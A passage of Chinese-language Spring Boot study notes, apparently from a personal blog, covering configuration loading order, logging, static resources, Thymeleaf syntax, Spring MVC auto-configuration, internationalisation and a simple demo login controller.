applescript">命令行参数都是<span class="hljs-comment">--</span><br><br><span class="hljs-comment">## 外部配置加载顺序</span><br><br>按照从高到低的优先级所有会形成互补配置<br><br></code></pre></td></tr></table></figure><p>1.命令行 ,如:–server.port &#x3D; 8087<br>优先加载带profile,在判断加载包外的到包内的<br>2.jar包外的application-{profile}.properties或application.yml(带spring.profile)配置文件<br>3.jar包内的application-{profile}.properties或application.yml(带spring.profile)配置文件<br>4.jar包外的application.properties或application.yml(不带spring.profile)配置文件<br>5.jar包内的application.properties或application.yml(不带spring.profile)配置文件<br>6.@Configuration注解类上的@PropertySource<br>7.通过SpringApplication.setDefaultProperties指定的默认属性</p>  <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># springboot自动加载<br><br>​![<span class="hljs-number">1595494900657</span>](C:\Users\lll\AppData\<span class="hljs-keyword">Local</span>\<span class="hljs-keyword">Temp</span>\<span class="hljs-number">1595494900657.</span>png)<br><br>*****AutoConfiguration:自动配置类<br><br>****Properties:封装配置文件中的相关属性<br><br>![<span class="hljs-number">1595495801212</span>](C:\Users\lll\AppData\<span class="hljs-keyword">Local</span>\<span class="hljs-keyword">Temp</span>\<span class="hljs-number">1595495801212.</span>png)<br><br>配置文件下设置<span class="hljs-keyword">debug</span> = <span class="hljs-keyword">true</span><br><br>可以显示都那些类成功自动配置<br><br># 日志<br><br>```java<br>Logger logger = LoggerFactory.getLogger(getClass());<br>    logger.trace(&quot;这是trace日志&quot;);<br>        logger.<span class="hljs-keyword">debug</span>(&quot;这是debug日志&quot;);<br>        logger.<span class="hljs-keyword">info</span>(&quot;这是info&quot;);<br>        logger.warn(&quot;这是warn&quot;);<br>        logger.error(&quot;这是error&quot;);<br>设置不同等级的信息<br>logging.<span class="hljs-keyword">level</span>.com.example.threedemo.threedemo = trace配置显示的等级<br>logging.file=spring.<span class="hljs-keyword">log</span>将日志写入这个文件(可以指定路径)<br>logging.path = /spring/<span class="hljs-keyword">log</span>指定目录<br><br>//格式建议百度搜索样式<br>logging.pattern.console=控制台输出的格式<br>logging.pattern.file=文件中日志输出的格式<br></code></pre></td></tr></table></figure><p>日志配置文件采用的时.xml的格式放到resource下</p><p>logback.xml会被框架识别</p><p>如果采用logback-spring.xml会被springboot识别</p><p>​<springProfile name="环境名"></springProfile></p><p>​<pattern>格式</pattern></p><p>​</p><p>​这样会在特定环境下使用这个格式,如果环境名前面加上!则会在非该环境下使用</p><p>日志转换</p><p>​pom.xml里面添加</p><p>​***AutoConfiguration类:给我们的容器中自动配置组件</p><p>​***Properties类:封装配置文件内容 就是那些类进行绑定</p><h3 id="SpringBoot对静态资源的规则"><a href="#SpringBoot对静态资源的规则" class="headerlink" title="SpringBoot对静态资源的规则"></a>SpringBoot对静态资源的规则</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addResourceHandlers</span><span class="hljs-params">(ResourceHandlerRegistry registry)</span> &#123;<br>   <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.resourceProperties.isAddMappings()) &#123;<br>      logger.debug(<span class="hljs-string">&quot;Default resource handling disabled&quot;</span>);<br>      <span class="hljs-keyword">return</span>;<br>   &#125;<br>   <span class="hljs-type">Duration</span> <span class="hljs-variable">cachePeriod</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.resourceProperties.getCache().getPeriod();<br>   <span class="hljs-type">CacheControl</span> <span class="hljs-variable">cacheControl</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.resourceProperties.getCache().getCachecontrol().toHttpCacheControl();<br>   <span class="hljs-keyword">if</span> (!registry.hasMappingForPattern(<span class="hljs-string">&quot;/webjars/**&quot;</span>)) &#123;<br>      customizeResourceHandlerRegistration(registry.addResourceHandler(<span class="hljs-string">&quot;/webjars/**&quot;</span>)<br>            .addResourceLocations(<span class="hljs-string">&quot;classpath:/META-INF/resources/webjars/&quot;</span>)<br>            .setCachePeriod(getSeconds(cachePeriod)).setCacheControl(cacheControl));<br>   &#125;<br>   <span class="hljs-type">String</span> <span class="hljs-variable">staticPathPattern</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.mvcProperties.getStaticPathPattern();<br>   <span class="hljs-keyword">if</span> (!registry.hasMappingForPattern(staticPathPattern)) &#123;<br>      customizeResourceHandlerRegistration(registry.addResourceHandler(staticPathPattern)<br>            .addResourceLocations(getResourceLocations(<span class="hljs-built_in">this</span>.resourceProperties.getStaticLocations()))<br>            .setCachePeriod(getSeconds(cachePeriod)).setCacheControl(cacheControl));<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">private</span> Integer <span class="hljs-title function_">getSeconds</span><span class="hljs-params">(Duration cachePeriod)</span> &#123;<br>   <span class="hljs-keyword">return</span> (cachePeriod != <span class="hljs-literal">null</span>) ? (<span class="hljs-type">int</span>) cachePeriod.getSeconds() : <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>​上面这段代码在WebMvcAutoConfiguration类里面的addResourceHandlers方法中记录了从那里获取静态资源</p><p>​由于上面的代码路径是classpath:&#x2F;META-INF&#x2F;resources&#x2F;webjars&#x2F;所以以后的访问</p><p>​<a href="http://localhost:端口/webjars/**(所有东西)都去这个路径下面找">http://localhost:端口/webjars/**(所有东西)都去这个路径下面找</a></p><p>​访问时需要引入jQuery的依赖去<a href="https://www.webjars.org/">https://www.webjars.org/</a>找访问时只需要填写resource下面的名称即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ConfigurationProperties(prefix = &quot;spring.resources&quot;, ignoreUnknownFields = false)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResourceProperties</span> <br><span class="hljs-comment">//可以在这里设置和静态资源有关的参数</span><br><span class="hljs-string">&quot;classpath:/META-INF/resources/&quot;</span>,     <br><span class="hljs-string">&quot;classpath:/resources/&quot;</span>, <br><span class="hljs-string">&quot;classpath:/static/&quot;</span>,<br><span class="hljs-string">&quot;classpath:/public/&quot;</span> <br><span class="hljs-string">&quot;/&quot;</span>如果找不到资源去这些文件夹下面找<br>但是所有的欢迎页静态资源下的所有的index.html被<span class="hljs-string">&quot;/**&quot;</span>映射<br>所以localhost:<span class="hljs-number">8080</span>会找index.html<br>**/favicon.ico网页的图标<br>修改默认路径spring.resource的路径<br></code></pre></td></tr></table></figure><h2 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h2><p>如JSP、Velocity、Freemarker、Thymeleaf</p><p>Thymeleaf</p><p>语法简单，功能更强大</p><p>用来切换版本</p><p>启用Thymeleaf后就可以自动在classpath：&#x2F;&#x2F;templates&#x2F;查找html文件</p><p>如发送</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/success&quot;)</span><br><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">success</span><span class="hljs-params">()</span>&#123;<br><br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>Thymeleaf语法</p><p>1.使用前在html中导入Thymeleaf的命名空间</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">xmlns:th</span> = <span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span><br>语法提示<br></code></pre></td></tr></table></figure><p>2.使用语法</p><p>在标签里面加属性来调用语法如</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:text</span> = <span class="hljs-string">&quot;$&#123;hello&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>语法规则</p><ol><li></li></ol><p>th:任意属性如th:id、th:class</p><p>th：insert、th：replace相当于include</p><p>th：each遍历</p><p>th：if、unless、switch、case判断</p><p>th：object、with 设置变量</p><p>th：attr、attrprepend、attrapped可以修改任意属性</p><p>th：属性</p><p>th：text修改标签里面的文本内容、utext不转义特殊字符</p><p>th：fragment声明片段</p><p>2.表达式</p> <figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">Simple</span> <span class="hljs-string">expressions:(表达式语法)</span><br>    <span class="hljs-attr">Variable</span> <span class="hljs-string">Expressions: $&#123;...&#125;获取变量值OGNL</span><br>    <span class="hljs-attr">1.获取属性</span><br>    <span class="hljs-attr">2.内置属性</span> <span class="hljs-string"></span><br><span class="hljs-comment">    #ctx : the context object.</span><br><span class="hljs-comment">            #vars: the context variables.</span><br><span class="hljs-comment">            #locale : the context locale.</span><br><span class="hljs-comment">            #request : (only in Web Contexts) the HttpServletRequest object.</span><br><span class="hljs-comment">            #response : (only in Web Contexts) the HttpServletResponse object.</span><br><span class="hljs-comment">            #session : (only in Web Contexts) the HttpSession object.</span><br><span class="hljs-comment">            #servletContext : (only in Web Contexts) the ServletContext object.</span><br><span class="hljs-attr">如Established</span> <span class="hljs-string">locale country: &lt;span th:text=&quot;$&#123;#locale.country&#125;&quot;&gt;US&lt;/span&gt;.</span><br><span class="hljs-attr">3.内置的工具对象</span><br><span class="hljs-comment">#execInfo : information about the template being processed.</span><br><span class="hljs-comment">        #messages : methods for obtaining externalized messages inside variables expressions, in the same way as they</span><br>        <span class="hljs-attr">would</span> <span class="hljs-string">be obtained using #&#123;…&#125; syntax.</span><br><span class="hljs-comment">        #uris : methods for escaping parts of URLs/URIs</span><br>        <span class="hljs-attr">Page</span> <span class="hljs-string">20 of 106</span><br><span class="hljs-comment">        #conversions : methods for executing the configured conversion service (if any).</span><br><span class="hljs-comment">        #dates : methods for java.util.Date objects: formatting, component extraction, etc.</span><br><span class="hljs-comment">        #calendars : analogous to #dates , but for java.util.Calendar objects.</span><br><span class="hljs-comment">        #numbers : methods for formatting numeric objects.</span><br><span class="hljs-comment">        #strings : methods for String objects: contains, startsWith, prepending/appending, etc.</span><br><span class="hljs-comment">        #objects : methods for objects in general.</span><br><span class="hljs-comment">        #bools : methods for boolean evaluation.</span><br><span class="hljs-comment">        #arrays : methods for arrays.</span><br><span class="hljs-comment">        #lists : methods for lists.</span><br><span class="hljs-comment">        #sets : methods for sets.</span><br><span class="hljs-comment">        #maps : methods for maps.</span><br><span class="hljs-comment">        #aggregates : methods for creating aggregates on arrays or collections.</span><br><span class="hljs-comment">        #ids : methods for dealing with id attributes that might be repeated (for example, as a result of an iteration).</span><br>    <span class="hljs-attr">Selection</span> <span class="hljs-string">Variable Expressions: *&#123;...&#125;变量选择表达式和$&#123;&#125;功能上一样</span><br>    <span class="hljs-attr">配合th</span>:<span class="hljs-string">object=&quot;$&#123;session.user&#125;&quot;进行使用后可以直接*&#123;firstName&#125;调用th:object的值</span><br>    <span class="hljs-attr">如</span><br>    <span class="hljs-attr">&lt;div</span> <span class="hljs-string">th:object=&quot;$&#123;session.user&#125;&quot;&gt;</span><br>        <span class="hljs-attr">&lt;p&gt;Name</span>: <span class="hljs-string">&lt;span th:text=&quot;*&#123;firstName&#125;&quot;&gt;Sebastian&lt;/span&gt;.&lt;/p&gt;</span><br>        <span class="hljs-attr">&lt;p&gt;Surname</span>: <span class="hljs-string">&lt;span th:text=&quot;*&#123;lastName&#125;&quot;&gt;Pepper&lt;/span&gt;.&lt;/p&gt;</span><br>        <span class="hljs-attr">&lt;p&gt;Nationality</span>: <span class="hljs-string">&lt;span th:text=&quot;*&#123;nationality&#125;&quot;&gt;Saturn&lt;/span&gt;.&lt;/p&gt;</span><br>        <span class="hljs-attr">&lt;/div&gt;</span><br><br>    <span class="hljs-attr">Message</span> <span class="hljs-string">Expressions: #&#123;...&#125;获取国际化内容</span><br>    <span class="hljs-attr">Link</span> <span class="hljs-string">URL Expressions: @&#123;...&#125;定义url链接</span><br>            <span class="hljs-attr">&lt;!--</span> <span class="hljs-string">Will produce &#x27;http://localhost:8080/gtvg/order/details?orderId=3&#x27; (plus rewriting) --&gt;</span><br>        <span class="hljs-attr">&lt;a</span> <span class="hljs-string">href=&quot;details.html&quot;</span><br>        <span class="hljs-attr">th</span>:<span class="hljs-string">href=&quot;@&#123;http://localhost:8080/gtvg/order/details(orderId=$&#123;o.id&#125;)&#125;&quot;&gt;view&lt;/a&gt;</span><br>        <span class="hljs-attr">&lt;!--</span> <span class="hljs-string">Will produce &#x27;/gtvg/order/details?orderId=3&#x27; (plus rewriting) --&gt;</span><br>        <span class="hljs-attr">&lt;a</span> <span class="hljs-string">href=&quot;details.html&quot; th:href=&quot;@&#123;/order/details(orderId=$&#123;o.id&#125;)&#125;&quot;&gt;view&lt;/a&gt;</span><br>        <span class="hljs-attr">&lt;!--</span> <span class="hljs-string">Will produce &#x27;/gtvg/order/3/details&#x27; (plus rewriting) --&gt;</span><br>        <span class="hljs-attr">&lt;a</span> <span class="hljs-string">href=&quot;details.html&quot; th:href=&quot;@&#123;/order/&#123;orderId&#125;/details(orderId=$&#123;o.id&#125;)&#125;&quot;&gt;view&lt;/a</span><br>        <br>        <br>    <span class="hljs-attr">Fragment</span> <span class="hljs-string">Expressions: ~&#123;...&#125;引用表达式</span><br>    <br><span class="hljs-attr">Literals</span>:<span class="hljs-string">(字面量)</span><br>    <span class="hljs-attr">Text</span> <span class="hljs-string">literals: &#x27;one text&#x27; , &#x27;Another one!&#x27; ,…</span><br>    <span class="hljs-attr">Number</span> <span class="hljs-string">literals: 0 , 34 , 3.0 , 12.3 ,…</span><br>    <span class="hljs-attr">Boolean</span> <span class="hljs-string">literals: true , false</span><br>    <span class="hljs-attr">Null</span> <span class="hljs-string">literal: null</span><br>    <span class="hljs-attr">Literal</span> <span class="hljs-string">tokens: one , sometext , main ,…</span><br><span class="hljs-attr">Text</span> <span class="hljs-string">operations:(文本操作)</span><br>    <span class="hljs-attr">String</span> <span class="hljs-string">concatenation: +</span><br>    <span class="hljs-attr">Literal</span> <span class="hljs-string">substitutions: |The name is $&#123;name&#125;|</span><br><span class="hljs-attr">Arithmetic</span> <span class="hljs-string">operations:(数学运算)</span><br>    <span class="hljs-attr">Binary</span> <span class="hljs-string">operators: + , - , * , / , %</span><br><span class="hljs-attr">Minus</span> <span class="hljs-string">sign :(unary operator): -</span><br><span class="hljs-attr">Boolean</span> <span class="hljs-string">operations:(布尔运算)</span><br>    <span class="hljs-attr">Binary</span> <span class="hljs-string">operators: and , or</span><br>    <span class="hljs-attr">Boolean</span> <span class="hljs-string">negation (unary operator): ! , not</span><br><span class="hljs-attr">Comparisons</span> <span class="hljs-string">and equality:(比较运算)</span><br>    <span class="hljs-attr">Comparators</span>: <span class="hljs-string">&gt; , &lt; , &gt;= , &lt;= ( gt , lt , ge , le )</span><br>    <span class="hljs-attr">Equality</span> <span class="hljs-string">operators: == , != ( eq , ne )</span><br><span class="hljs-attr">Conditional</span> <span class="hljs-string">operators:(条件运算)</span><br>    <span class="hljs-attr">If-then</span>: <span class="hljs-string">(if) ? (then)</span><br>    <span class="hljs-attr">If-then-else</span>: <span class="hljs-string">(if) ? (then) : (else)</span><br>    <span class="hljs-attr">Default</span>: <span class="hljs-string">(value) ?: (defaultvalue)</span><br><span class="hljs-attr">Special</span> <span class="hljs-string">tokens:(没有操作)</span><br><br><span class="hljs-attr">No-Operation</span>:<span class="hljs-string">_</span><br></code></pre></td></tr></table></figure><p>标签内容里面写th的话用[[thy语法]]</p><h2 id="springboot对springMVC的自动配置"><a href="#springboot对springMVC的自动配置" class="headerlink" title="springboot对springMVC的自动配置"></a>springboot对springMVC的自动配置</h2><h5 id="1-ContentNegotiatingViewResolver和BeanNameViewResolver的组件"><a href="#1-ContentNegotiatingViewResolver和BeanNameViewResolver的组件" class="headerlink" title="1.ContentNegotiatingViewResolver和BeanNameViewResolver的组件"></a>1.ContentNegotiatingViewResolver和BeanNameViewResolver的组件</h5><p>​自动配置了ViewResolver(视图解析器:根据方法返回值并得到视图对象(View),视图对象决定如何渲染(转发?重定向?))</p><p>​ContentNegotiatingViewResolver:用来组合所有的视图解析器</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs aspectj">我们可以给容器中添加一个视图解析器;自动的将其组合进来<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">myViewResolver</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ViewResolver</span></span>&#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function">View <span class="hljs-title">resolveViewName</span><span class="hljs-params">(String s, Locale locale)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h5 id="2-静态资源文件夹-Webjars"><a href="#2-静态资源文件夹-Webjars" class="headerlink" title="2.静态资源文件夹(Webjars)"></a>2.静态资源文件夹(Webjars)</h5><h5 id="3-自动注册了Converter-GenericConverter-Formatter"><a href="#3-自动注册了Converter-GenericConverter-Formatter" class="headerlink" title="3.自动注册了Converter,GenericConverter,Formatter"></a>3.自动注册了Converter,GenericConverter,Formatter</h5><p>​Converter:对页面提供的数据能够自动转换(数据一一对应)</p><p>​GenericConverter:</p><p>​Formatter:格式化器(按照一定的格式来转化如2017.12.17&#x3D;&#x3D;Date类型)</p><p>​<code>自己添加格式化器和转换器只需要放在容器中即可和上面的视图转换器应该差不多</code></p><p>​</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">HttpMessageConverter</span>用来彖传请求和响应的;例如一个<span class="hljs-selector-tag">User</span>对象转换为<span class="hljs-selector-tag">json</span><br>想要添加<span class="hljs-selector-tag">HttpMessageConverter</span>只需要将自己的组件注册到容器中(<span class="hljs-variable">@Bean</span>,<span class="hljs-variable">@Component</span>)<br></code></pre></td></tr></table></figure><p>MessageCodeResolver定义错误代码生成规则</p><p>ConfigurationWebBindingInitalizer:可以自己创建一个来替换默认的</p><p>用来初始化WebDataBinder的(请求的数据和那个组件进行绑定)</p><p>!</p><p>使用WebMvcConfigurationSupport扩展spring MVC的功能</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.fourdemo.config;<br><br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.ViewControllerRegistry;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurationSupport;<br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyMvcSupport</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WebMvcConfigurationSupport</span> &#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addViewControllers</span><span class="hljs-params">(ViewControllerRegistry registry)</span> &#123;<br><span class="hljs-comment">//            super.addViewControllers(registry);</span><br>            <span class="hljs-comment">//浏览器发送atguigu请求</span><br>            registry.addViewController(<span class="hljs-string">&quot;/index&quot;</span>).setViewName(<span class="hljs-string">&quot;/hello&quot;</span>);<br>        &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs aspectj">如果用了要自己配置所有的springMVC 可以添加<span class="hljs-meta">@EnableWebMvc</span>来直接全面接管springMVC(所有的自动配置都失效)<br><br>不推荐<br></code></pre></td></tr></table></figure><p>如果用server.context-path修改路径想要自动添加修改html的链接路径要用th:属性 &#x3D; “@{}”进行修改</p><h1 id="页面国际化"><a href="#页面国际化" class="headerlink" title="页面国际化"></a>页面国际化</h1><p>配置国际化文件SpringBoot自动配置好国际化资源组件</p><p>配置文件可以直接放在类路径下叫做message.properties</p><p>spring.message.basename&#x3D;i18n.login(按照上面的图为例)设置properties</p><h5 id="还记得-这个就是获取国际化信息的"><a href="#还记得-这个就是获取国际化信息的" class="headerlink" title="还记得#{}这个就是获取国际化信息的"></a>还记得#{}这个就是获取国际化信息的</h5><p>对称标签的text用</p><p>没有对称标签的text用</p><p>文件如果加载失败会显示这样结果</p><p>***LocaleResolver获取区域信息类</p><p>实现切换功能就要用一个类来继承LocaleResolver这样可以接收到区域信息的请求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyLocaleResolver</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">LocaleResolver</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Locale <span class="hljs-title function_">resolveLocale</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">l</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;l&quot;</span>);<br>        <span class="hljs-comment">//获得网页默认的语言</span><br>        <span class="hljs-type">Locale</span> <span class="hljs-variable">locale</span> <span class="hljs-operator">=</span> Locale.getDefault();<br>        <span class="hljs-comment">//判断请求是否为空</span><br>        <span class="hljs-keyword">if</span>(!l.isEmpty())<br>        &#123;<br>            String []split = l.split(<span class="hljs-string">&quot;_&quot;</span>);<br>            <span class="hljs-comment">//第一个参数是语言信息第二个国家信息</span><br>            locale = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Locale</span>(split[<span class="hljs-number">0</span>],split[<span class="hljs-number">1</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> locale;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLocale</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Locale locale)</span> &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>创建完类还要添加到组件中这样才能替换自动配置的组件</p><p>注意组件名必须为localeResolver</p><h2 id="请求处理"><a href="#请求处理" class="headerlink" title="请求处理"></a>请求处理</h2><p>@DeleteMapping|@PutMapping|@GetMapping|@PostMapping|@RequestMapping</p><p>@RequestParam：将请求参数绑定到你控制器的方法参数上（是springmvc中接收普通参数的注解）</p><p>对于@PostMapping可以用@RequestParam来指定形参想要接收到的数据,形参里面放一个Map可以返回设置返回数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@PostMapping(value = &quot;/user/login&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">login</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username,</span><br><span class="hljs-params">                        <span class="hljs-meta">@RequestParam(&quot;password&quot;)</span> String password,</span><br><span class="hljs-params">                        Map&lt;String,Object&gt; map</span><br><span class="hljs-params">    )</span>&#123;<br>        <span class="hljs-keyword">if</span>(!StringUtils.isEmpty(username)&amp;&amp;username.equals(<span class="hljs-string">&quot;123456&quot;</span>)&amp;&amp;password.equals(<span class="hljs-string">&quot;123456&quot;</span>))<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;dashboard&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            map.put(<span class="hljs-string">&quot;message&quot;</span>,<span class="hljs-string">&quot;用户名或密码错误&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>而html来处理返回的数据可以先用th:if来判断是否存在数据然后用th:text来设置值如果th:if不生效则p不会生效</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: red&quot;</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;message&#125;&quot;</span> <span class="hljs-attr">th:if</span>=<span class="hljs-string">&quot;$&#123;not #strings.isEmpty(message)&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span 